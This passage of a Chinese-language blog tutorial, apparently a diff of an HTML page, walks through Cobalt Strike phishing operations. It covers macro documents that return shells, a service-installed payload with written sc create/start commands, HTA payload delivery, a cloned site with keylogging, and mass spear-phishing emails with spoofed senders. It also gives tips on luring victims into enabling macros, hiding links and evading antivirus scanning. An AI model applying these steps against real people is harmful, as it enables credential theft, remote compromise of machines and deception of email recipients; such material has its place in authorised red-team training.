+<p>保存的时候直接被火绒杀了，所以在测试的时候建议先把杀软关了</p>
+<p><img src="../index_files/5f4ed26a-951e-4ce6-95e6-77542c60e124.png" alt="img"></p>
+<p>打开后会提示安全警告，这时候点启用内容成功执行宏，在实际钓鱼过程中需要想办法诱导对方执行</p>
+<p><img src="../index_files/9331620b-1f68-41bb-b502-11c5082d4765.png" alt="img"></p>
+<p>加载完成后可以看到直接得到了shell</p>
+<p><img src="../index_files/47718348-7a78-4a56-855b-a5c421a693e7.png" alt="img"></p>
+<p>shell中可以直接进行列出文件等操作</p>
+<h2 id="http监听服务上线">HTTP监听，服务上线</h2>
+<p>首先以HTTPS形式创建监听</p>
+<p><img src="../index_files/1cd5e2db-7997-4870-8160-91b21f626659.png" alt="img"></p>
+<p>然后进行生成payload，选择windows service exe</p>
+<p><img src="../index_files/6b12f4c6-d759-4b71-a79b-cf7488c365b9.png" alt="img"></p>
+<p>将目标文件放到根目录下，改名成test.exe，然后执行命令sc create artifact binpath= &ldquo;C:\test.exe&rdquo; start= auto displayname= &ldquo;test service&rdquo;</p>
+<p><img src="../index_files/d743effd-9408-4be7-95c4-e87f2573054f.png" alt="img"></p>
+<p>可以看到服务已经创建</p>
+<p><img src="../index_files/1349f200-0d4a-4a79-a24f-70550806c044.png" alt="img"></p>
+<p>然后启动服务</p>
+<p><img src="../index_files/d439f95b-c0b9-4c22-b1ae-8342f1ed981f.png" alt="img"></p>
+<p>启动以后在CS中成功收到shell</p>
+<p><img src="../index_files/bc2bc025-0fe4-4319-9758-4729cf2e71f6.png" alt="img"></p>
+<p>以服务形式启动：</p>
+<p>服务的创建，启动、停止和删除</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sc create artifact binpath= <span style="color:#e6db74">&#34;C:\test.exe&#34;</span> start= auto displayname= <span style="color:#e6db74">&#34;test service&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sc start artifact
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sc delete artifact
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sc stop artifact
+</span></span></code></pre></div><p>服务启动和普通exe启动的区别:</p>
+<p>如果服务以管理员权限创建，则返回的权限会直接到System，而普通exe返回的目标则是默认用户权限</p>
+<p>https传输可以让流量防止被一些防护软件进行方向解析</p>
+<h2 id="cs-webdrive钓鱼">CS WEBdrive钓鱼</h2>
+<p>信息收集不需要创建监听</p>
+<p>选择攻击类型为SystemProfiler</p>
+<p><img src="../index_files/96b16790-36bc-4f14-b4a0-bc0b6b0eb985.png" alt="img"></p>
+<p>设置跳转链接和源地址</p>
+<p><img src="../index_files/4ec5777c-ceee-4138-84b2-1df37bac6de1.png" alt="img"></p>
+<p>通过浏览器访问后跳转到了百度</p>
+<p><img src="../index_files/0dbcdcb1-b186-4a9f-b0a3-0ba6bfec4140.png" alt="img"></p>
+<p>这时候在CS的View中打开查看窗口</p>
+<p><img src="../index_files/b5cb343c-14f8-4ecc-a094-ff5aa73388f5.png" alt="img"></p>
+<p>因为火绒的拦截内部地址没有显示，本来会显示内网IP，同时external会显示公网IP</p>
+<p><img src="../index_files/175a1085-cf6e-46df-88c3-29e71ece0102.png" alt="img"></p>
+<p>所以火绒的策略还是比较有效的</p>
+<p><img src="../index_files/8154c6d3-515e-440c-8d78-a1c19ce5db5a.png" alt="img"></p>
+<p>如果通过虚拟机直接访问，就可以看到直接收到了IP地址</p>
+<p><img src="../index_files/ed7db92b-5cb1-4bf8-9d3b-2cde8eaebbe5.png" alt="img"></p>
+<p>为了钓鱼的成功性和隐蔽性，建议连接使用短网址压缩或者其他方式加密</p>
+<h2 id="webdrive配合hta上线">WEBDrive配合HTA上线</h2>
+<p>创建监听，仍和之前类型一样属于http反弹shell</p>
+<p>生成HTA Payload</p>
+<p><img src="../index_files/1b9a8181-e87e-4f1e-a746-a67b26874d37.png" alt="img"></p>
+<p>类型建议选择ps，毕竟ps强大</p>
+<p><img src="../index_files/9500062f-0868-4b1a-b947-030efa7f7244.png" alt="img"></p>
+<p>生成的HTA是可执行的</p>
+<p><img src="../index_files/9bb9a350-3ac6-4031-a90f-4d58fc7d7563.jpg" alt="img"></p>
+<p>将HTA先放到服务器上（也就是先生成），再进行HostsFile配置</p>
+<p><img src="../index_files/66fed4c3-a14b-44cf-900c-68a6970e7a38.png" alt="img"></p>
+<p><img src="../index_files/f5305707-44f9-4c26-80fe-8269aa72e596.png" alt="img"></p>
+<p>查看和管理我们的钓鱼链接</p>
+<p><img src="../index_files/3754e901-ff3c-4d33-a861-9c1feb5668ac.png" alt="img"></p>
+<p>然后开始假装受害者访问连接</p>
+<p><img src="../index_files/f8d87e91-f9c7-419c-aa2b-0a9507c8d402.png" alt="img"></p>
+<p>访问后确保我们的木马可以下载</p>
+<p><img src="../index_files/c6626b9a-c634-4c07-a62b-6aaeb150ac93.jpg" alt="img"></p>
+<p>运行HTA主机就上线了</p>
+<p><img src="../index_files/591f91ae-4d78-40e0-9fa7-01d6b73e06c2.png" alt="img"></p>
+<h2 id="cs-clone站点">CS clone站点</h2>
+<p>克隆钓鱼站点（需要把之前的site先删掉，或者更改端口，不然会报错导致服务无法启动）</p>
+<p><img src="../index_files/dee1cb6c-ca43-4e62-ac8d-a932a02e0a05.png" alt="img"></p>
+<p><img src="../index_files/cd9a6980-b455-455a-b53a-3fb214b76cf2.png" alt="img"></p>
+<p>访问网站</p>
+<p><img src="../index_files/49b71c1d-322f-40ad-8c83-b1da318f82d2.png" alt="img"></p>
+<p>会出现请求下载木马，然后再点clone site，进行如下配置，记住点上下面那个小勾用于启动键盘记录</p>
+<p><img src="../index_files/b9cc6b8f-4f5f-45dc-b2bd-168764418168.png" alt="img"></p>
+<p>可以看到此时模拟的页面和百度一模一样</p>
+<p><img src="../index_files/b02673d7-a1d5-4f74-a223-41dc84bf1a97.png" alt="img"></p>
+<p>通过WEBlog查看键盘记录</p>
+<p><img src="../index_files/1ac180ca-5b51-4eda-ae05-5d32436b9e9c.png" alt="img"></p>
+<p><img src="../index_files/607aa0e6-7693-4a6d-a9b8-25f18b8bad78.png" alt="img"></p>
+<p>克隆完了就可以和之前的信息收集来一套组合拳，首先配置Clone页面，这边端口先放81</p>
+<p><img src="../index_files/81ef2274-d8ec-4c9b-897e-38246d0901d6.png" alt="img"></p>
+<p>然后我们再来配置信息收集</p>
+<p><img src="../index_files/4f8098b6-cfa0-4532-b46f-174cd1ad0daa.png" alt="img"></p>
+<p>模拟受害者的访问地址为172.16.12.129，默认80端口，然后重定向到clone站点，收到了系统信息</p>
+<p><img src="../index_files/ead66bde-aa53-4518-a2a9-f725a354bf87.png" alt="img"></p>
+<p>同时键盘记录也成功捕获到了</p>
+<p><img src="../index_files/647ed25d-35ba-41fc-ac48-6b1fee812889.png" alt="img"></p>
+<p>克隆和获取信息这两个不能倒置，如果倒置了，也就是克隆站点是那个获取信息的页面，也就是如下配置</p>
+<p><img src="../index_files/2f465234-3fc0-4cbb-9a44-8e62d8d35673.png" alt="img"></p>
+<p>因为默认的设置了如果请求不到就开始刷新，就开始无限套娃了&hellip;</p>
+<p><img src="../index_files/3a97aa9e-e1f9-4651-8798-a013b12e23ba.png" alt="img"></p>
+<p>并且这时候还会对自己的CS接受进行轰炸，真·自己打自己</p>
+<p><img src="../index_files/50b9868d-45f3-4960-a691-02ad204667c8.png" alt="img"></p>
+<h2 id="批量发送钓鱼邮件">批量发送钓鱼邮件</h2>
+<p>首先创建HTTP类型监听</p>
+<p><img src="../index_files/5ad096d8-14ab-4c69-896f-4afe7ecf5cca.png" alt="img"></p>
+<p>针对内网业务环境考虑到很多文件均为office文档，因此我们创建宏病毒</p>
+<p><img src="../index_files/5200908f-98a3-4f51-8636-b95085d5d352.png" alt="img"></p>
+<p>将宏文档生成后为避免云查杀，因此采用winrar等软件加密压缩</p>
+<p><img src="../index_files/9066ae4f-054b-4290-84b7-3395a659d395.png" alt="img"></p>
+<p>创建clone site，这时候已经有了钓鱼链接和木马</p>
+<p><img src="../index_files/7efd14f3-4ac6-4608-9b71-e92559b61a80.png" alt="img"></p>
+<p>然后我们开始发送钓鱼邮件，进行鱼叉攻击</p>
+<p><img src="../index_files/cc98009f-8052-4d33-a026-a4fc5bafea41.png" alt="img"></p>
+<p><img src="../index_files/deab156e-f2a9-4b58-8b79-a648a1b8049b.png" alt="img"></p>
+<p>1.存放钓鱼目标地址的文件</p>
+<p>2.内容模板</p>
+<p>3.邮件附件</p>
+<p>4.钓鱼链接（可以直接选择之前生成的）</p>
+<p>5.邮件服务器</p>
+<p>6.想要伪造的发件人</p>
+<p>通过发送邮件获取邮件原文作为我们的内容模板，通过邮箱导出EML文件</p>
+<p><img src="../index_files/e791ae9b-909c-4202-8a52-41df095944bb.png" alt="img"></p>
+<p>配好后如下</p>
+<p><img src="../index_files/874c22ba-c072-4cbd-9c99-e2affbd2960e.png" alt="img"></p>
+<p>邮件发送这时候是失败的，因为这个Bounce好像一定要是认证发信人，就是和上面MailServer一样，改成一样就成功了，和真的简直一模一样</p>
+<p><img src="../index_files/05377b79-57af-4aa1-9d16-9a269098aa50.png" alt="img"></p>
+<p>并且我们可以看到其中超链接的地址已经被替换了</p>
+<p><img src="../index_files/848aa951-795c-4cf7-a58a-5d53e9003c4f.png" alt="img"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
